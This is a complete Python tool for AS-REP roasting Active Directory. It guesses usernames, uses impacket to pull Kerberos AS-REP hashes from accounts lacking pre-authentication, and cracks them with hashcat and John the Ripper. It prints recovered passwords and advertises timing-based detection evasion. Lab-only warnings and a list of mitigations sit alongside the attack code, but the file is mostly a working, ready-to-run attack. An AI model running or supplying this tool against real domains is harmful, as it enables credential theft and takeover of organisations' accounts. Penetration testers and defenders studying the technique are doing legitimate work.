#!/usr/bin/env python3
"""
Automated AS-REP Roasting Tool
Version: 2.0
Author: Emerson
Date: February 2025

Features:
- Automatic user enumeration
- Multiple hash format outputs (Hashcat, John)
- Integrated hash cracking
- Results correlation and reporting
- Detection evasion with timing controls
- Comprehensive logging
"""

import subprocess
import argparse
import json
import time
import sys
import re
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from colorama import Fore, Style, Back, init
import hashlib

init(autoreset=True)

VERSION = "2.0"


class UserEnumerator:
    """Enumerate potential usernames"""
    
    DEFAULT_USERS = [
        # Common service accounts
        'krbtgt', 'admin', 'administrator', 'guest',
        'service', 'backup', 'test', 'dev', 'support',
        
        # Service principals
        'http', 'https', 'ldap', 'cifs', 'mssql', 'postgres',
        'mysql', 'oracle', 'ftp', 'smtp', 'imap',
        
        # Common names
        'user', 'helpdesk', 'it', 'manager', 'director',
        'secretary', 'reception', 'sales', 'marketing',
        
        # System accounts
        'root', 'system', 'daemon', 'bin', 'sync',
        'nobody', 'sshd', 'vagrant'
    ]
    
    @classmethod
    def load_from_file(cls, filename: str) -> List[str]:
        """Load usernames from file"""
        try:
            with open(filename, 'r') as f:
                users = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(users)} usernames from {filename}")
            return users
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File not found: {filename}")
            return []
    
    @classmethod
    def get_default_list(cls) -> List[str]:
        """Get default username list"""
        print(f"{Fore.YELLOW}[*] Using default username list ({len(cls.DEFAULT_USERS)} users)")
        return cls.DEFAULT_USERS.copy()
    
    @classmethod
    def generate_variations(cls, base_users: List[str]) -> List[str]:
        """Generate username variations"""
        variations = set(base_users)
        
        for user in base_users:
            # Case variations
            variations.add(user.lower())
            variations.add(user.upper())
            variations.add(user.capitalize())
            
            # With numbers
            for i in range(1, 6):
                variations.add(f"{user}{i}")
                variations.add(f"{user}0{i}")
            
            # Service variations
            variations.add(f"{user}svc")
            variations.add(f"{user}service")
            variations.add(f"svc{user}")
        
        return list(variations)


class ASREPRoaster:
    """Main AS-REP roasting orchestrator"""
    
    def __init__(
        self,
        realm: str,
        kdc: str,
        userlist: Optional[str] = None,
        output_dir: str = "asrep_results",
        delay: float = 2.0,
        crack: bool = False,
        wordlist: Optional[str] = None,
        generate_variations: bool = False
    ):
        self.realm = realm.upper()
        self.kdc = kdc
        self.userlist = userlist
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.delay = delay
        self.crack = crack
        self.wordlist = wordlist
        self.generate_variations = generate_variations
        
        self.roastable_users = []
        self.hashes = {}
        self.cracked_passwords = {}
        self.scan_results = []
    
    def check_impacket(self) -> bool:
        """Verify impacket is installed"""
        try:
            result = subprocess.run(
                ['which', 'impacket-GetNPUsers'],
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False
    
    def enumerate_users(self) -> List[str]:
        """Get list of users to test"""
        if self.userlist:
            users = UserEnumerator.load_from_file(self.userlist)
        else:
            users = UserEnumerator.get_default_list()
        
        if self.generate_variations:
            print(f"{Fore.YELLOW}[*] Generating username variations...")
            users = UserEnumerator.generate_variations(users)
            print(f"{Fore.GREEN}[+] Total usernames to test: {len(users)}")
        
        return users
    
    def check_asrep_roastable(self, username: str) -> Tuple[bool, Optional[str], str]:
        """
        Check if user is AS-REP roastable
        Returns: (roastable: bool, hash: str, message: str)
        """
        try:
            result = subprocess.run(
                [
                    'impacket-GetNPUsers',
                    f'{self.realm}/{username}',
                    '-dc-ip', self.kdc,
                    '-no-pass',
                    '-format', 'hashcat'
                ],
                capture_output=True,
                timeout=15,
                text=True
            )
            
            output = result.stdout + result.stderr
            
            # Check for hash
            if '$krb5asrep$23$' in output:
                # Extract hash
                for line in output.split('\n'):
                    if '$krb5asrep$23$' in line:
                        hash_value = line.strip()
                        return True, hash_value, "AS-REP Roastable"
            
            # Parse other responses
            if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' in output:
                return False, None, "User doesn't exist"
            elif 'KDC_ERR_PREAUTH_REQUIRED' in output or "User doesn't have UF_DONT_REQUIRE_PREAUTH" in output:
                return False, None, "Pre-auth required (secure)"
            elif 'KDC_ERR_CLIENT_REVOKED' in output:
                return False, None, "Account disabled"
            else:
                return False, None, f"Unknown response: {output[:50]}"
        
        except subprocess.TimeoutExpired:
            return False, None, "Timeout"
        except Exception as e:
            return False, None, f"Error: {str(e)[:50]}"
    
    def scan_user(self, username: str):
        """Scan single user for AS-REP roastability"""
        print(f"{Fore.CYAN}[*] Testing {username}@{self.realm}...", end=" ")
        
        roastable, hash_value, message = self.check_asrep_roastable(username)
        
        result = {
            'username': username,
            'realm': self.realm,
            'roastable': roastable,
            'hash': hash_value if hash_value else None,
            'message': message,
            'timestamp': datetime.now().isoformat()
        }
        
        self.scan_results.append(result)
        
        if roastable:
            print(f"{Fore.GREEN}✓ ROASTABLE!")
            print(f"{Fore.GREEN}    Hash: {hash_value[:80]}...")
            self.roastable_users.append(username)
            self.hashes[username] = hash_value
        else:
            if 'exist' in message:
                print(f"{Fore.RED}✗ {message}")
            elif 'secure' in message:
                print(f"{Fore.YELLOW}○ {message}")
            else:
                print(f"{Fore.YELLOW}? {message}")
    
    def save_hashes(self) -> Tuple[Optional[Path], Optional[Path]]:
        """Save hashes in multiple formats"""
        if not self.hashes:
            return None, None
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Hashcat format
        hashcat_file = self.output_dir / f"asrep_hashcat_{timestamp}.txt"
        with open(hashcat_file, 'w') as f:
            for username, hash_value in self.hashes.items():
                f.write(f"{hash_value}\n")
        
        print(f"{Fore.GREEN}[+] Hashes saved (Hashcat): {hashcat_file}")
        
        # John format
        john_file = self.output_dir / f"asrep_john_{timestamp}.txt"
        with open(john_file, 'w') as f:
            for username, hash_value in self.hashes.items():
                f.write(f"{hash_value}\n")
        
        print(f"{Fore.GREEN}[+] Hashes saved (John): {john_file}")
        
        # Human-readable format
        readable_file = self.output_dir / f"asrep_readable_{timestamp}.txt"
        with open(readable_file, 'w') as f:
            f.write("AS-REP Roasting Results\n")
            f.write("="*60 + "\n")
            f.write(f"Scan Time: {datetime.now().isoformat()}\n")
            f.write(f"Realm: {self.realm}\n")
            f.write(f"KDC: {self.kdc}\n")
            f.write(f"Roastable Users: {len(self.roastable_users)}\n")
            f.write("="*60 + "\n\n")
            
            for username, hash_value in self.hashes.items():
                f.write(f"Username: {username}@{self.realm}\n")
                f.write(f"Hash: {hash_value}\n")
                f.write("-"*60 + "\n")
        
        print(f"{Fore.GREEN}[+] Human-readable format: {readable_file}")
        
        return hashcat_file, john_file
    
    def crack_with_john(self, hashfile: Path) -> Dict[str, str]:
        """Attempt to crack hashes with John the Ripper"""
        cracked = {}
        
        try:
            print(f"{Fore.YELLOW}[*] Attempting to crack with John the Ripper...")
            
            # Run john
            subprocess.run(
                ['john', f'--wordlist={self.wordlist}', str(hashfile)],
                capture_output=True,
                timeout=300
            )
            
            # Show results
            result = subprocess.run(
                ['john', '--show', str(hashfile)],
                capture_output=True,
                text=True
            )
            
            if result.stdout:
                print(f"{Fore.GREEN}[+] John results:")
                for line in result.stdout.split('\n'):
                    if ':' in line and '$' in line:
                        # Parse: $krb5asrep$23$user@REALM:password
                        try:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                # Extract username from hash
                                hash_part = parts[0]
                                password = parts[1]
                                
                                # Extract username
                                user_match = re.search(r'\$([^@]+)@', hash_part)
                                if user_match:
                                    username = user_match.group(1)
                                    cracked[username] = password
                                    print(f"{Fore.GREEN}    {username}: {password}")
                        except:
                            pass
        
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[!] John timed out")
        except FileNotFoundError:
            print(f"{Fore.RED}[!] John the Ripper not found")
        except Exception as e:
            print(f"{Fore.RED}[!] John error: {e}")
        
        return cracked
    
    def crack_with_hashcat(self, hashfile: Path) -> Dict[str, str]:
        """Attempt to crack hashes with Hashcat"""
        cracked = {}
        
        try:
            print(f"{Fore.YELLOW}[*] Attempting to crack with Hashcat...")
            
            # Run hashcat
            subprocess.run(
                [
                    'hashcat',
                    '-m', '18200',  # Kerberos 5 AS-REP etype 23
                    '-a', '0',      # Dictionary attack
                    str(hashfile),
                    self.wordlist,
                    '--force',
                    '--quiet'
                ],
                capture_output=True,
                timeout=300
            )
            
            # Show results
            result = subprocess.run(
                ['hashcat', '-m', '18200', str(hashfile), '--show'],
                capture_output=True,
                text=True
            )
            
            if result.stdout:
                print(f"{Fore.GREEN}[+] Hashcat results:")
                for line in result.stdout.split('\n'):
                    if ':' in line and '$' in line:
                        try:
                            parts = line.split(':')
                            hash_part = parts[0]
                            password = parts[-1].strip()
                            
                            # Extract username
                            user_match = re.search(r'\$([^@]+)@', hash_part)
                            if user_match:
                                username = user_match.group(1)
                                if username not in cracked:  # Avoid duplicates
                                    cracked[username] = password
                                    print(f"{Fore.GREEN}    {username}: {password}")
                        except:
                            pass
        
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[!] Hashcat timed out")
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Hashcat not found")
        except Exception as e:
            print(f"{Fore.RED}[!] Hashcat error: {e}")
        
        return cracked
    
    def crack_hashes(self, hashfile: Path):
        """Attempt to crack all hashes"""
        if not self.wordlist:
            print(f"{Fore.YELLOW}[*] No wordlist provided, skipping cracking")
            return
        
        if not Path(self.wordlist).exists():
            print(f"{Fore.RED}[!] Wordlist not found: {self.wordlist}")
            return
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Hash Cracking")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Wordlist: {self.wordlist}")
        print(f"{Fore.CYAN}Hashes: {len(self.hashes)}")
        print(f"{Fore.CYAN}{'='*60}\n")
        
        # Try both tools
        cracked_john = self.crack_with_john(hashfile)
        cracked_hashcat = self.crack_with_hashcat(hashfile)
        
        # Merge results
        self.cracked_passwords.update(cracked_john)
        self.cracked_passwords.update(cracked_hashcat)
        
        if self.cracked_passwords:
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}Cracked Passwords Summary")
            print(f"{Fore.GREEN}{'='*60}")
            for username, password in self.cracked_passwords.items():
                print(f"{Fore.GREEN}  {username}@{self.realm}: {password}")
            print(f"{Fore.GREEN}{'='*60}\n")
    
    def generate_report(self):
        """Generate comprehensive JSON report"""
        report_file = self.output_dir / f"asrep_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report = {
            'metadata': {
                'tool': 'AS-REP Roasting Automated',
                'version': VERSION,
                'timestamp': datetime.now().isoformat(),
                'realm': self.realm,
                'kdc': self.kdc
            },
            'scan_statistics': {
                'users_tested': len(self.scan_results),
                'roastable_found': len(self.roastable_users),
                'hashes_captured': len(self.hashes),
                'passwords_cracked': len(self.cracked_passwords)
            },
            'findings': {
                'roastable_users': self.roastable_users,
                'cracked_credentials': self.cracked_passwords
            },
            'hashes': {
                username: f"{hash_value[:80]}..." 
                for username, hash_value in self.hashes.items()
            },
            'detailed_results': self.scan_results,
            'recommendations': [
                'Enable Kerberos pre-authentication for ALL user accounts',
                'Audit accounts with "Do not require Kerberos pre-authentication" flag',
                'Implement strong password policies (15+ chars, complexity)',
                'Monitor for AS-REQ without pre-auth data',
                'Consider migrating to managed service accounts',
                'Regular password rotation for service accounts',
                'Implement account lockout policies',
                'Use Azure AD Password Protection or similar'
            ],
            'mitigation_steps': {
                'immediate': [
                    'Identify all accounts in scan results',
                    'Enable pre-authentication for each account',
                    'Force password reset for cracked accounts',
                    'Review account usage and necessity'
                ],
                'short_term': [
                    'Implement password complexity requirements',
                    'Set up monitoring for pre-auth disabled accounts',
                    'Create alert for repeated AS-REQ failures'
                ],
                'long_term': [
                    'Migrate to managed service accounts where possible',
                    'Implement regular security audits',
                    'Consider hardware-based authentication',
                    'Adopt zero-trust architecture'
                ]
            }
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Comprehensive report saved: {report_file}")
    
    def print_summary(self):
        """Print final summary"""
        print(f"\n{Back.CYAN}{Fore.BLACK}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}AS-REP Roasting Summary")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"Realm: {self.realm}")
        print(f"KDC: {self.kdc}")
        print(f"Users tested: {len(self.scan_results)}")
        print(f"Roastable users: {Fore.GREEN if self.roastable_users else Fore.YELLOW}{len(self.roastable_users)}{Style.RESET_ALL}")
        print(f"Hashes captured: {Fore.GREEN if self.hashes else Fore.YELLOW}{len(self.hashes)}{Style.RESET_ALL}")
        print(f"Passwords cracked: {Fore.GREEN if self.cracked_passwords else Fore.YELLOW}{len(self.cracked_passwords)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if self.roastable_users:
            print(f"{Back.RED}{Fore.BLACK}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.RED}VULNERABLE ACCOUNTS DETECTED!")
            print(f"{Fore.RED}{'='*60}")
            for username in self.roastable_users:
                if username in self.cracked_passwords:
                    print(f"{Fore.RED}  ✗ {username}@{self.realm} - CRACKED: {self.cracked_passwords[username]}")
                else:
                    print(f"{Fore.YELLOW}  ! {username}@{self.realm} - Hash captured (not cracked)")
            print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}\n")
    
    def run(self):
        """Execute AS-REP roasting attack"""
        print(f"\n{Back.CYAN}{Fore.BLACK}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}AS-REP Roasting Attack v{VERSION}")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Target Realm: {self.realm}")
        print(f"{Fore.CYAN}KDC: {self.kdc}")
        print(f"{Fore.CYAN}Delay: {self.delay}s between checks")
        print(f"{Fore.CYAN}Cracking: {'Enabled' if self.crack else 'Disabled'}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        # Check dependencies
        if not self.check_impacket():
            print(f"{Fore.RED}[!] impacket-GetNPUsers not found!")
            print(f"{Fore.RED}[!] Install: pip install impacket")
            sys.exit(1)
        
        # Enumerate users
        users = self.enumerate_users()
        
        print(f"{Fore.YELLOW}[*] Testing {len(users)} usernames...")
        print(f"{Fore.YELLOW}[*] This may take a while...\n")
        
        # Scan each user
        for i, username in enumerate(users, 1):
            self.scan_user(username)
            
            # Progress indicator
            if i % 10 == 0:
                print(f"{Fore.CYAN}[*] Progress: {i}/{len(users)} users tested")
            
            # Rate limiting
            if self.delay > 0:
                time.sleep(self.delay)
        
        # Save hashes
        if self.hashes:
            print(f"\n{Fore.CYAN}[*] Saving captured hashes...")
            hashcat_file, john_file = self.save_hashes()
            
            # Crack if requested
            if self.crack and hashcat_file:
                self.crack_hashes(hashcat_file)
        else:
            print(f"\n{Fore.GREEN}[+] No vulnerable accounts found - all users have pre-auth enabled!")
        
        # Generate report
        self.generate_report()
        
        # Print summary
        self.print_summary()


def main():
    parser = argparse.ArgumentParser(
        description=f"Automated AS-REP Roasting Tool v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic AS-REP roasting with default usernames
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20
  
  # With custom user list
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20 -u users.txt
  
  # With username variations
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20 -u users.txt --variations
  
  # With automatic cracking
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20 --crack -w rockyou.txt
  
  # Full automated attack
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20 -u users.txt --variations --crack -w passwords.txt

⚠️  WARNING: Use only in authorized lab environments!
⚠️  AS-REP roasting is a real attack technique - use responsibly!

Author: Emerson | Version: {VERSION} | Date: February 2025
        """
    )
    
    parser.add_argument('-r', '--realm', required=True, help='Kerberos realm (e.g., LAB.LOCAL)')
    parser.add_argument('-k', '--kdc', required=True, help='KDC IP address or hostname')
    parser.add_argument('-u', '--userlist', help='File containing usernames to test')
    parser.add_argument('-o', '--output-dir', default='asrep_results', help='Output directory')
    parser.add_argument('-d', '--delay', type=float, default=2.0, help='Delay between checks (seconds)')
    parser.add_argument('--variations', action='store_true', help='Generate username variations')
    parser.add_argument('--crack', action='store_true', help='Attempt to crack captured hashes')
    parser.add_argument('-w', '--wordlist', help='Wordlist for cracking (required if --crack)')
    parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
    
    args = parser.parse_args()
    
    # Validation
    if args.crack and not args.wordlist:
        print(f"{Fore.RED}[!] --wordlist required when using --crack")
        sys.exit(1)
    
    # Create roaster
    roaster = ASREPRoaster(
        realm=args.realm,
        kdc=args.kdc,
        userlist=args.userlist,
        output_dir=args.output_dir,
        delay=args.delay,
        crack=args.crack,
        wordlist=args.wordlist,
        generate_variations=args.variations
    )
    
    # Run attack
    roaster.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)